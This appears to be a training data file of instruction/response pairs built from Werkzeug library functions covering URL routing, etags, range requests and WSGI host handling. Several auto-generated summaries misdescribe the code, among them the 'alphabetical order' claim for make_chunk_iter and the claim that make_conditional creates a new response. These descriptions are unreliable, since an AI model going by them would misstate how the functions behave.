{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse a rule and return it as generator.", "response": "def parse_rule(rule):\n    \"\"\"Parse a rule and return it as generator. Each iteration yields tuples\n    in the form ``(converter, arguments, variable)``. If the converter is\n    `None` it's a static url part, otherwise it's a dynamic one.\n\n    :internal:\n    \"\"\"\n    pos = 0\n    end = len(rule)\n    do_match = _rule_re.match\n    used_names = set()\n    while pos < end:\n        m = do_match(rule, pos)\n        if m is None:\n            break\n        data = m.groupdict()\n        if data[\"static\"]:\n            yield None, None, data[\"static\"]\n        variable = data[\"variable\"]\n        converter = data[\"converter\"] or \"default\"\n        if variable in used_names:\n            raise ValueError(\"variable name %r used twice.\" % variable)\n        used_names.add(variable)\n        yield converter, data[\"args\"] or None, variable\n        pos = m.end()\n    if pos < end:\n        remaining = rule[pos:]\n        if \">\" in remaining or \"<\" in remaining:\n            raise ValueError(\"malformed url rule: %r\" % rule)\n        yield None, None, remaining"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_endpoint_expecting(self, endpoint, *arguments):\n        self.update()\n        arguments = set(arguments)\n        for rule in self._rules_by_endpoint[endpoint]:\n            if arguments.issubset(rule.arguments):\n                return True\n        return False", "response": "Checks if the given endpoint expects the given arguments."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\niterate over all rules or the rules of an endpoint.", "response": "def iter_rules(self, endpoint=None):\n        \"\"\"Iterate over all rules or the rules of an endpoint.\n\n        :param endpoint: if provided only the rules for that endpoint\n                         are returned.\n        :return: an iterator\n        \"\"\"\n        self.update()\n        if endpoint is not None:\n            return iter(self._rules_by_endpoint[endpoint])\n        return iter(self._rules)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a new rule or factory to the map and binds it to the rules_by_endpoint.", "response": "def add(self, rulefactory):\n        \"\"\"Add a new rule or factory to the map and bind it.  Requires that the\n        rule is not bound to another map.\n\n        :param rulefactory: a :class:`Rule` or :class:`RuleFactory`\n        \"\"\"\n        for rule in rulefactory.get_rules(self):\n            rule.bind(self)\n            self._rules.append(rule)\n            self._rules_by_endpoint.setdefault(rule.endpoint, []).append(rule)\n        self._remap = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef bind(\n        self,\n        server_name,\n        script_name=None,\n        subdomain=None,\n        url_scheme=\"http\",\n        default_method=\"GET\",\n        path_info=None,\n        query_args=None,\n    ):\n        \"\"\"Return a new :class:`MapAdapter` with the details specified to the\n        call.  Note that `script_name` will default to ``'/'`` if not further\n        specified or `None`.  The `server_name` at least is a requirement\n        because the HTTP RFC requires absolute URLs for redirects and so all\n        redirect exceptions raised by Werkzeug will contain the full canonical\n        URL.\n\n        If no path_info is passed to :meth:`match` it will use the default path\n        info passed to bind.  While this doesn't really make sense for\n        manual bind calls, it's useful if you bind a map to a WSGI\n        environment which already contains the path info.\n\n        `subdomain` will default to the `default_subdomain` for this map if\n        no defined. If there is no `default_subdomain` you cannot use the\n        subdomain feature.\n\n        .. versionadded:: 0.7\n           `query_args` added\n\n        .. versionadded:: 0.8\n           `query_args` can now also be a string.\n\n        .. versionchanged:: 0.15\n            ``path_info`` defaults to ``'/'`` if ``None``.\n        \"\"\"\n        server_name = server_name.lower()\n        if self.host_matching:\n            if subdomain is not None:\n                raise RuntimeError(\"host matching enabled and a subdomain was provided\")\n        elif subdomain is None:\n            subdomain = self.default_subdomain\n        if script_name is None:\n            script_name = \"/\"\n        if path_info is None:\n            path_info = \"/\"\n        try:\n            server_name = _encode_idna(server_name)\n        except UnicodeError:\n            raise BadHost()\n        return MapAdapter(\n            self,\n            server_name,\n            script_name,\n            subdomain,\n            url_scheme,\n            path_info,\n            default_method,\n            query_args,\n        )", "response": "Bind a new instance of the class MapAdapter with the details specified to the current instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef bind_to_environ(self, environ, server_name=None, subdomain=None):\n        environ = _get_environ(environ)\n\n        wsgi_server_name = get_host(environ).lower()\n\n        if server_name is None:\n            server_name = wsgi_server_name\n        else:\n            server_name = server_name.lower()\n\n        if subdomain is None and not self.host_matching:\n            cur_server_name = wsgi_server_name.split(\".\")\n            real_server_name = server_name.split(\".\")\n            offset = -len(real_server_name)\n            if cur_server_name[offset:] != real_server_name:\n                # This can happen even with valid configs if the server was\n                # accesssed directly by IP address under some situations.\n                # Instead of raising an exception like in Werkzeug 0.7 or\n                # earlier we go by an invalid subdomain which will result\n                # in a 404 error on matching.\n                subdomain = \"<invalid>\"\n            else:\n                subdomain = \".\".join(filter(None, cur_server_name[:offset]))\n\n        def _get_wsgi_string(name):\n            val = environ.get(name)\n            if val is not None:\n                return wsgi_decoding_dance(val, self.charset)\n\n        script_name = _get_wsgi_string(\"SCRIPT_NAME\")\n        path_info = _get_wsgi_string(\"PATH_INFO\")\n        query_args = _get_wsgi_string(\"QUERY_STRING\")\n        return Map.bind(\n            self,\n            server_name,\n            script_name,\n            subdomain,\n            environ[\"wsgi.url_scheme\"],\n            environ[\"REQUEST_METHOD\"],\n            path_info,\n            query_args=query_args,\n        )", "response": "Bind to the WSGI environment and return the server name and subdomain."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self):\n        if not self._remap:\n            return\n\n        with self._remap_lock:\n            if not self._remap:\n                return\n\n            self._rules.sort(key=lambda x: x.match_compare_key())\n            for rules in itervalues(self._rules_by_endpoint):\n                rules.sort(key=lambda x: x.build_compare_key())\n            self._remap = False", "response": "Called before matching and building to keep the compiled rules\n            in the correct order after things changed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndoing the complete dispatching process. `view_func` is called with the endpoint and a dict with the values for the view. It should look up the view function, call it, and return a response object or WSGI application. http exceptions are not caught by default so that applications can display nicer error messages by just catching them by hand. If you want to stick with the default error messages you can pass it ``catch_http_exceptions=True`` and it will catch the http exceptions. Here a small example for the dispatch usage:: from werkzeug.wrappers import Request, Response from werkzeug.wsgi import responder from werkzeug.routing import Map, Rule def on_index(request): return Response('Hello from the index') url_map = Map([Rule('/', endpoint='index')]) views = {'index': on_index} @responder def application(environ, start_response): request = Request(environ) urls = url_map.bind_to_environ(environ) return urls.dispatch(lambda e, v: views[e](request, **v), catch_http_exceptions=True) Keep in mind that this method might return exception objects, too, so use :class:`Response.force_type` to get a response object. :param view_func: a function that is called with the endpoint as first argument and the value dict as second. Has to dispatch to the actual view function with this information. (see above) :param path_info: the path info to use for matching. Overrides the path info specified on binding. :param method: the HTTP method used for matching. Overrides the method specified on binding. :param catch_http_exceptions: set to `True` to catch any of the werkzeug :class:`HTTPException`\\\\s.", "response": "def dispatch(\n        self, view_func, path_info=None, method=None, catch_http_exceptions=False\n    ):\n        \"\"\"Does the complete dispatching process.  `view_func` is called with\n        the endpoint and a dict with the values for the view.  It should\n        look up the view function, call it, and return a response object\n        or WSGI application.  http exceptions are not caught by default\n        so that applications can display nicer error messages by just\n        catching them by hand.  If you want to stick with the default\n        error messages you can pass it ``catch_http_exceptions=True`` and\n        it will catch the http exceptions.\n\n        Here a small example for the dispatch usage::\n\n            from werkzeug.wrappers import Request, Response\n            from werkzeug.wsgi import responder\n            from werkzeug.routing import Map, Rule\n\n            def on_index(request):\n                return Response('Hello from the index')\n\n            url_map = Map([Rule('/', endpoint='index')])\n            views = {'index': on_index}\n\n            @responder\n            def application(environ, start_response):\n                request = Request(environ)\n                urls = url_map.bind_to_environ(environ)\n                return urls.dispatch(lambda e, v: views[e](request, **v),\n                                     catch_http_exceptions=True)\n\n        Keep in mind that this method might return exception objects, too, so\n        use :class:`Response.force_type` to get a response object.\n\n        :param view_func: a function that is called with the endpoint as\n                          first argument and the value dict as second.  Has\n                          to dispatch to the actual view function with this\n                          information.  (see above)\n        :param path_info: the path info to use for matching.  Overrides the\n                          path info specified on binding.\n        :param method: the HTTP method used for matching.  Overrides the\n                       method specified on binding.\n        :param catch_http_exceptions: set to `True` to catch any of the\n                                      werkzeug :class:`HTTPException`\\\\s.\n        \"\"\"\n        try:\n            try:\n                endpoint, args = self.match(path_info, method)\n            except RequestRedirect as e:\n                return e\n            return view_func(endpoint, args)\n        except HTTPException as e:\n            if catch_http_exceptions:\n                return e\n            raise"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef allowed_methods(self, path_info=None):\n        try:\n            self.match(path_info, method=\"--\")\n        except MethodNotAllowed as e:\n            return e.valid_methods\n        except HTTPException:\n            pass\n        return []", "response": "Returns the list of allowed methods that match for a given path."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfigures out the full host name for the given domain part.", "response": "def get_host(self, domain_part):\n        \"\"\"Figures out the full host name for the given domain part.  The\n        domain part is a subdomain in case host matching is disabled or\n        a full host name.\n        \"\"\"\n        if self.map.host_matching:\n            if domain_part is None:\n                return self.server_name\n            return to_unicode(domain_part, \"ascii\")\n        subdomain = domain_part\n        if subdomain is None:\n            subdomain = self.subdomain\n        else:\n            subdomain = to_unicode(subdomain, \"ascii\")\n        return (subdomain + u\".\" if subdomain else u\"\") + self.server_name"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_default_redirect(self, rule, method, values, query_args):\n        assert self.map.redirect_defaults\n        for r in self.map._rules_by_endpoint[rule.endpoint]:\n            # every rule that comes after this one, including ourself\n            # has a lower priority for the defaults.  We order the ones\n            # with the highest priority up for building.\n            if r is rule:\n                break\n            if r.provides_defaults_for(rule) and r.suitable_for(values, method):\n                values.update(r.defaults)\n                domain_part, path = r.build(values)\n                return self.make_redirect_url(path, query_args, domain_part=domain_part)", "response": "A helper that returns the URL to redirect to if it finds one."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef make_redirect_url(self, path_info, query_args=None, domain_part=None):\n        suffix = \"\"\n        if query_args:\n            suffix = \"?\" + self.encode_query_args(query_args)\n        return str(\n            \"%s://%s/%s%s\"\n            % (\n                self.url_scheme or \"http\",\n                self.get_host(domain_part),\n                posixpath.join(\n                    self.script_name[:-1].lstrip(\"/\"), path_info.lstrip(\"/\")\n                ),\n                suffix,\n            )\n        )", "response": "Creates a redirect URL."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef build(\n        self,\n        endpoint,\n        values=None,\n        method=None,\n        force_external=False,\n        append_unknown=True,\n    ):\n        \"\"\"Building URLs works pretty much the other way round.  Instead of\n        `match` you call `build` and pass it the endpoint and a dict of\n        arguments for the placeholders.\n\n        The `build` function also accepts an argument called `force_external`\n        which, if you set it to `True` will force external URLs. Per default\n        external URLs (include the server name) will only be used if the\n        target URL is on a different subdomain.\n\n        >>> m = Map([\n        ...     Rule('/', endpoint='index'),\n        ...     Rule('/downloads/', endpoint='downloads/index'),\n        ...     Rule('/downloads/<int:id>', endpoint='downloads/show')\n        ... ])\n        >>> urls = m.bind(\"example.com\", \"/\")\n        >>> urls.build(\"index\", {})\n        '/'\n        >>> urls.build(\"downloads/show\", {'id': 42})\n        '/downloads/42'\n        >>> urls.build(\"downloads/show\", {'id': 42}, force_external=True)\n        'http://example.com/downloads/42'\n\n        Because URLs cannot contain non ASCII data you will always get\n        bytestrings back.  Non ASCII characters are urlencoded with the\n        charset defined on the map instance.\n\n        Additional values are converted to unicode and appended to the URL as\n        URL querystring parameters:\n\n        >>> urls.build(\"index\", {'q': 'My Searchstring'})\n        '/?q=My+Searchstring'\n\n        When processing those additional values, lists are furthermore\n        interpreted as multiple values (as per\n        :py:class:`werkzeug.datastructures.MultiDict`):\n\n        >>> urls.build(\"index\", {'q': ['a', 'b', 'c']})\n        '/?q=a&q=b&q=c'\n\n        Passing a ``MultiDict`` will also add multiple values:\n\n        >>> urls.build(\"index\", MultiDict((('p', 'z'), ('q', 'a'), ('q', 'b'))))\n        '/?p=z&q=a&q=b'\n\n        If a rule does not exist when building a `BuildError` exception is\n        raised.\n\n        The build method accepts an argument called `method` which allows you\n        to specify the method you want to have an URL built for if you have\n        different methods for the same endpoint specified.\n\n        .. versionadded:: 0.6\n           the `append_unknown` parameter was added.\n\n        :param endpoint: the endpoint of the URL to build.\n        :param values: the values for the URL to build.  Unhandled values are\n                       appended to the URL as query parameters.\n        :param method: the HTTP method for the rule if there are different\n                       URLs for different methods on the same endpoint.\n        :param force_external: enforce full canonical external URLs. If the URL\n                               scheme is not provided, this will generate\n                               a protocol-relative URL.\n        :param append_unknown: unknown parameters are appended to the generated\n                               URL as query string argument.  Disable this\n                               if you want the builder to ignore those.\n        \"\"\"\n        self.map.update()\n\n        if values:\n            if isinstance(values, MultiDict):\n                temp_values = {}\n                # iteritems(dict, values) is like `values.lists()`\n                # without the call or `list()` coercion overhead.\n                for key, value in iteritems(dict, values):\n                    if not value:\n                        continue\n                    if len(value) == 1:  # flatten single item lists\n                        value = value[0]\n                        if value is None:  # drop None\n                            continue\n                    temp_values[key] = value\n                values = temp_values\n            else:\n                # drop None\n                values = dict(i for i in iteritems(values) if i[1] is not None)\n        else:\n            values = {}\n\n        rv = self._partial_build(endpoint, values, method, append_unknown)\n        if rv is None:\n            raise BuildError(endpoint, values, method, self)\n        domain_part, path = rv\n\n        host = self.get_host(domain_part)\n\n        # shortcut this.\n        if not force_external and (\n            (self.map.host_matching and host == self.server_name)\n            or (not self.map.host_matching and domain_part == self.subdomain)\n        ):\n            return \"%s/%s\" % (self.script_name.rstrip(\"/\"), path.lstrip(\"/\"))\n        return str(\n            \"%s//%s%s/%s\"\n            % (\n                self.url_scheme + \":\" if self.url_scheme else \"\",\n                host,\n                self.script_name[:-1],\n                path.lstrip(\"/\"),\n            )\n        )", "response": "Builds a URL for the given base URL."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef export(string, template=None, **extra):\n\n    def wrapped(f):\n        endpoint = (f.__module__ + \".\" + f.__name__)[16:]\n        if template is not None:\n            old_f = f\n\n            def f(**kwargs):\n                rv = old_f(**kwargs)\n                if not isinstance(rv, Response):\n                    rv = TemplateResponse(template, **(rv or {}))\n                return rv\n\n            f.__name__ = old_f.__name__\n            f.__doc__ = old_f.__doc__\n        exported_views[endpoint] = (f, string, extra)\n        return f\n\n    return wrapped", "response": "Decorator for registering a function and adding a new template to the views list."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\npushes a new item to the stack", "response": "def push(self, obj):\n        \"\"\"Pushes a new item to the stack\"\"\"\n        rv = getattr(self._local, \"stack\", None)\n        if rv is None:\n            self._local.stack = rv = []\n        rv.append(obj)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nremove the topmost item from the stack. Returns None if the stack is empty.", "response": "def pop(self):\n        \"\"\"Removes the topmost item from the stack, will return the\n        old value or `None` if the stack was already empty.\n        \"\"\"\n        stack = getattr(self._local, \"stack\", None)\n        if stack is None:\n            return None\n        elif len(stack) == 1:\n            release_local(self._local)\n            return stack[-1]\n        else:\n            return stack.pop()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nwrap a WSGI application so that cleaning up happens after request end.", "response": "def make_middleware(self, app):\n        \"\"\"Wrap a WSGI application so that cleaning up happens after\n        request end.\n        \"\"\"\n\n        def application(environ, start_response):\n            return ClosingIterator(app(environ, start_response), self.cleanup)\n\n        return application"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nwraps existing Response in case of Range Request context.", "response": "def _wrap_response(self, start, length):\n        \"\"\"Wrap existing Response in case of Range Request context.\"\"\"\n        if self.status_code == 206:\n            self.response = _RangeWrapper(self.response, start, length)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _is_range_request_processable(self, environ):\n        return (\n            \"HTTP_IF_RANGE\" not in environ\n            or not is_resource_modified(\n                environ,\n                self.headers.get(\"etag\"),\n                None,\n                self.headers.get(\"last-modified\"),\n                ignore_if_range=False,\n            )\n        ) and \"HTTP_RANGE\" in environ", "response": "Return True if Range header is present and if If - Range header is not present and if the underlying\n            resource is considered unchanged when compared with If - Range header."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _process_range_request(self, environ, complete_length=None, accept_ranges=None):\n        from ..exceptions import RequestedRangeNotSatisfiable\n\n        if accept_ranges is None:\n            return False\n        self.headers[\"Accept-Ranges\"] = accept_ranges\n        if not self._is_range_request_processable(environ) or complete_length is None:\n            return False\n        parsed_range = parse_range_header(environ.get(\"HTTP_RANGE\"))\n        if parsed_range is None:\n            raise RequestedRangeNotSatisfiable(complete_length)\n        range_tuple = parsed_range.range_for_length(complete_length)\n        content_range_header = parsed_range.to_content_range_header(complete_length)\n        if range_tuple is None or content_range_header is None:\n            raise RequestedRangeNotSatisfiable(complete_length)\n        content_length = range_tuple[1] - range_tuple[0]\n        # Be sure not to send 206 response\n        # if requested range is the full content.\n        if content_length != complete_length:\n            self.headers[\"Content-Length\"] = content_length\n            self.content_range = content_range_header\n            self.status_code = 206\n            self._wrap_response(range_tuple[0], content_length)\n            return True\n        return False", "response": "Handle Range Request related headers."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef make_conditional(\n        self, request_or_environ, accept_ranges=False, complete_length=None\n    ):\n        \"\"\"Make the response conditional to the request.  This method works\n        best if an etag was defined for the response already.  The `add_etag`\n        method can be used to do that.  If called without etag just the date\n        header is set.\n\n        This does nothing if the request method in the request or environ is\n        anything but GET or HEAD.\n\n        For optimal performance when handling range requests, it's recommended\n        that your response data object implements `seekable`, `seek` and `tell`\n        methods as described by :py:class:`io.IOBase`.  Objects returned by\n        :meth:`~werkzeug.wsgi.wrap_file` automatically implement those methods.\n\n        It does not remove the body of the response because that's something\n        the :meth:`__call__` function does for us automatically.\n\n        Returns self so that you can do ``return resp.make_conditional(req)``\n        but modifies the object in-place.\n\n        :param request_or_environ: a request object or WSGI environment to be\n                                   used to make the response conditional\n                                   against.\n        :param accept_ranges: This parameter dictates the value of\n                              `Accept-Ranges` header. If ``False`` (default),\n                              the header is not set. If ``True``, it will be set\n                              to ``\"bytes\"``. If ``None``, it will be set to\n                              ``\"none\"``. If it's a string, it will use this\n                              value.\n        :param complete_length: Will be used only in valid Range Requests.\n                                It will set `Content-Range` complete length\n                                value and compute `Content-Length` real value.\n                                This parameter is mandatory for successful\n                                Range Requests completion.\n        :raises: :class:`~werkzeug.exceptions.RequestedRangeNotSatisfiable`\n                 if `Range` header could not be parsed or satisfied.\n        \"\"\"\n        environ = _get_environ(request_or_environ)\n        if environ[\"REQUEST_METHOD\"] in (\"GET\", \"HEAD\"):\n            # if the date is not in the headers, add it now.  We however\n            # will not override an already existing header.  Unfortunately\n            # this header will be overriden by many WSGI servers including\n            # wsgiref.\n            if \"date\" not in self.headers:\n                self.headers[\"Date\"] = http_date()\n            accept_ranges = _clean_accept_ranges(accept_ranges)\n            is206 = self._process_range_request(environ, complete_length, accept_ranges)\n            if not is206 and not is_resource_modified(\n                environ,\n                self.headers.get(\"etag\"),\n                None,\n                self.headers.get(\"last-modified\"),\n            ):\n                if parse_etags(environ.get(\"HTTP_IF_MATCH\")):\n                    self.status_code = 412\n                else:\n                    self.status_code = 304\n            if (\n                self.automatically_set_content_length\n                and \"content-length\" not in self.headers\n            ):\n                length = self.calculate_content_length()\n                if length is not None:\n                    self.headers[\"Content-Length\"] = length\n        return self", "response": "This method creates a new response object that is a conditional to the request."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd an etag for the current response if it does not already exist.", "response": "def add_etag(self, overwrite=False, weak=False):\n        \"\"\"Add an etag for the current response if there is none yet.\"\"\"\n        if overwrite or \"etag\" not in self.headers:\n            self.set_etag(generate_etag(self.get_data()), weak)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_etag(self, etag, weak=False):\n        self.headers[\"ETag\"] = quote_etag(etag, weak)", "response": "Set the etag and override the old one."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncall this method if you want to make your response object ready for pickeling.", "response": "def freeze(self, no_etag=False):\n        \"\"\"Call this method if you want to make your response object ready for\n        pickeling.  This buffers the generator if there is one.  This also\n        sets the etag unless `no_etag` is set to `True`.\n        \"\"\"\n        if not no_etag:\n            self.add_etag()\n        super(ETagResponseMixin, self).freeze()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the host for the given WSGI environment.", "response": "def get_host(environ, trusted_hosts=None):\n    \"\"\"Return the host for the given WSGI environment. This first checks\n    the ``Host`` header. If it's not present, then ``SERVER_NAME`` and\n    ``SERVER_PORT`` are used. The host will only contain the port if it\n    is different than the standard port for the protocol.\n\n    Optionally, verify that the host is trusted using\n    :func:`host_is_trusted` and raise a\n    :exc:`~werkzeug.exceptions.SecurityError` if it is not.\n\n    :param environ: The WSGI environment to get the host from.\n    :param trusted_hosts: A list of trusted hosts.\n    :return: Host, with port if necessary.\n    :raise ~werkzeug.exceptions.SecurityError: If the host is not\n        trusted.\n    \"\"\"\n    if \"HTTP_HOST\" in environ:\n        rv = environ[\"HTTP_HOST\"]\n        if environ[\"wsgi.url_scheme\"] == \"http\" and rv.endswith(\":80\"):\n            rv = rv[:-3]\n        elif environ[\"wsgi.url_scheme\"] == \"https\" and rv.endswith(\":443\"):\n            rv = rv[:-4]\n    else:\n        rv = environ[\"SERVER_NAME\"]\n        if (environ[\"wsgi.url_scheme\"], environ[\"SERVER_PORT\"]) not in (\n            (\"https\", \"443\"),\n            (\"http\", \"80\"),\n        ):\n            rv += \":\" + environ[\"SERVER_PORT\"]\n    if trusted_hosts is not None:\n        if not host_is_trusted(rv, trusted_hosts):\n            from .exceptions import SecurityError\n\n            raise SecurityError('Host \"%s\" is not trusted' % rv)\n    return rv"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_query_string(environ):\n    qs = wsgi_get_bytes(environ.get(\"QUERY_STRING\", \"\"))\n    # QUERY_STRING really should be ascii safe but some browsers\n    # will send us some unicode stuff (I am looking at you IE).\n    # In that case we want to urllib quote it badly.\n    return try_coerce_native(url_quote(qs, safe=\":&%=+$!*'(),\"))", "response": "Returns the QUERY_STRING from the WSGI environment object."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nextracts the path info from the given URL or WSGI environment dict and the given path.", "response": "def extract_path_info(\n    environ_or_baseurl,\n    path_or_url,\n    charset=\"utf-8\",\n    errors=\"werkzeug.url_quote\",\n    collapse_http_schemes=True,\n):\n    \"\"\"Extracts the path info from the given URL (or WSGI environment) and\n    path.  The path info returned is a unicode string, not a bytestring\n    suitable for a WSGI environment.  The URLs might also be IRIs.\n\n    If the path info could not be determined, `None` is returned.\n\n    Some examples:\n\n    >>> extract_path_info('http://example.com/app', '/app/hello')\n    u'/hello'\n    >>> extract_path_info('http://example.com/app',\n    ...                   'https://example.com/app/hello')\n    u'/hello'\n    >>> extract_path_info('http://example.com/app',\n    ...                   'https://example.com/app/hello',\n    ...                   collapse_http_schemes=False) is None\n    True\n\n    Instead of providing a base URL you can also pass a WSGI environment.\n\n    :param environ_or_baseurl: a WSGI environment dict, a base URL or\n                               base IRI.  This is the root of the\n                               application.\n    :param path_or_url: an absolute path from the server root, a\n                        relative path (in which case it's the path info)\n                        or a full URL.  Also accepts IRIs and unicode\n                        parameters.\n    :param charset: the charset for byte data in URLs\n    :param errors: the error handling on decode\n    :param collapse_http_schemes: if set to `False` the algorithm does\n                                  not assume that http and https on the\n                                  same server point to the same\n                                  resource.\n\n    .. versionchanged:: 0.15\n        The ``errors`` parameter defaults to leaving invalid bytes\n        quoted instead of replacing them.\n\n    .. versionadded:: 0.6\n    \"\"\"\n\n    def _normalize_netloc(scheme, netloc):\n        parts = netloc.split(u\"@\", 1)[-1].split(u\":\", 1)\n        if len(parts) == 2:\n            netloc, port = parts\n            if (scheme == u\"http\" and port == u\"80\") or (\n                scheme == u\"https\" and port == u\"443\"\n            ):\n                port = None\n        else:\n            netloc = parts[0]\n            port = None\n        if port is not None:\n            netloc += u\":\" + port\n        return netloc\n\n    # make sure whatever we are working on is a IRI and parse it\n    path = uri_to_iri(path_or_url, charset, errors)\n    if isinstance(environ_or_baseurl, dict):\n        environ_or_baseurl = get_current_url(environ_or_baseurl, root_only=True)\n    base_iri = uri_to_iri(environ_or_baseurl, charset, errors)\n    base_scheme, base_netloc, base_path = url_parse(base_iri)[:3]\n    cur_scheme, cur_netloc, cur_path, = url_parse(url_join(base_iri, path))[:3]\n\n    # normalize the network location\n    base_netloc = _normalize_netloc(base_scheme, base_netloc)\n    cur_netloc = _normalize_netloc(cur_scheme, cur_netloc)\n\n    # is that IRI even on a known HTTP scheme?\n    if collapse_http_schemes:\n        for scheme in base_scheme, cur_scheme:\n            if scheme not in (u\"http\", u\"https\"):\n                return None\n    else:\n        if not (base_scheme in (u\"http\", u\"https\") and base_scheme == cur_scheme):\n            return None\n\n    # are the netlocs compatible?\n    if base_netloc != cur_netloc:\n        return None\n\n    # are we below the application path?\n    base_path = base_path.rstrip(u\"/\")\n    if not cur_path.startswith(base_path):\n        return None\n\n    return u\"/\" + cur_path[len(base_path) :].lstrip(u\"/\")"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntake a stream and returns an iterator over the items in the alphabetical order.", "response": "def make_chunk_iter(\n    stream, separator, limit=None, buffer_size=10 * 1024, cap_at_buffer=False\n):\n    \"\"\"Works like :func:`make_line_iter` but accepts a separator\n    which divides chunks.  If you want newline based processing\n    you should use :func:`make_line_iter` instead as it\n    supports arbitrary newline markers.\n\n    .. versionadded:: 0.8\n\n    .. versionadded:: 0.9\n       added support for iterators as input stream.\n\n    .. versionadded:: 0.11.10\n       added support for the `cap_at_buffer` parameter.\n\n    :param stream: the stream or iterate to iterate over.\n    :param separator: the separator that divides chunks.\n    :param limit: the limit in bytes for the stream.  (Usually\n                  content length.  Not necessary if the `stream`\n                  is otherwise already limited).\n    :param buffer_size: The optional buffer size.\n    :param cap_at_buffer: if this is set chunks are split if they are longer\n                          than the buffer size.  Internally this is implemented\n                          that the buffer size might be exhausted by a factor\n                          of two however.\n    \"\"\"\n    _iter = _make_chunk_iter(stream, limit, buffer_size)\n\n    first_item = next(_iter, \"\")\n    if not first_item:\n        return\n\n    _iter = chain((first_item,), _iter)\n    if isinstance(first_item, text_type):\n        separator = to_unicode(separator)\n        _split = re.compile(r\"(%s)\" % re.escape(separator)).split\n        _join = u\"\".join\n    else:\n        separator = to_bytes(separator)\n        _split = re.compile(b\"(\" + re.escape(separator) + b\")\").split\n        _join = b\"\".join\n\n    buffer = []\n    while 1:\n        new_data = next(_iter, \"\")\n        if not new_data:\n            break\n        chunks = _split(new_data)\n        new_buf = []\n        buf_size = 0\n        for item in chain(buffer, chunks):\n            if item == separator:\n                yield _join(new_buf)\n                new_buf = []\n                buf_size = 0\n            else:\n                buf_size += len(item)\n                new_buf.append(item)\n\n                if cap_at_buffer and buf_size >= buffer_size:\n                    rv = _join(new_buf)\n                    while len(rv) >= buffer_size:\n                        yield rv[:buffer_size]\n                        rv = rv[buffer_size:]\n                    new_buf = [rv]\n                    buf_size = len(rv)\n\n        buffer = new_buf\n    if buffer:\n        yield _join(buffer)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _is_ascii_encoding(encoding):\n    if encoding is None:\n        return False\n    try:\n        return codecs.lookup(encoding).name == \"ascii\"\n    except LookupError:\n        return False", "response": "Determines if an encoding is ASCII."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the filesystem encoding that should be used for the current system.", "response": "def get_filesystem_encoding():\n    \"\"\"Returns the filesystem encoding that should be used. Note that this is\n    different from the Python understanding of the filesystem encoding which\n    might be deeply flawed. Do not use this value against Python's unicode APIs\n    because it might be different. See :ref:`filesystem-encoding` for the exact\n    behavior.\n\n    The concept of a filesystem encoding in generally is not something you\n    should rely on. As such if you ever need to use this function except for\n    writing wrapper code reconsider.\n    \"\"\"\n    global _warned_about_filesystem_encoding\n    rv = sys.getfilesystemencoding()\n    if has_likely_buggy_unicode_filesystem and not rv or _is_ascii_encoding(rv):\n        if not _warned_about_filesystem_encoding:\n            warnings.warn(\n                \"Detected a misconfigured UNIX filesystem: Will use\"\n                \" UTF-8 as filesystem encoding instead of {0!r}\".format(rv),\n                BrokenFilesystemWarning,\n            )\n            _warned_about_filesystem_encoding = True\n        return \"utf-8\"\n    return rv"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfinds all paths that should be observed.", "response": "def _find_observable_paths(extra_files=None):\n    \"\"\"Finds all paths that should be observed.\"\"\"\n    rv = set(\n        os.path.dirname(os.path.abspath(x)) if os.path.isfile(x) else os.path.abspath(x)\n        for x in sys.path\n    )\n\n    for filename in extra_files or ():\n        rv.add(os.path.dirname(os.path.abspath(filename)))\n\n    for module in list(sys.modules.values()):\n        fn = getattr(module, \"__file__\", None)\n        if fn is None:\n            continue\n        fn = os.path.abspath(fn)\n        rv.add(os.path.dirname(fn))\n\n    return _find_common_roots(rv)"}
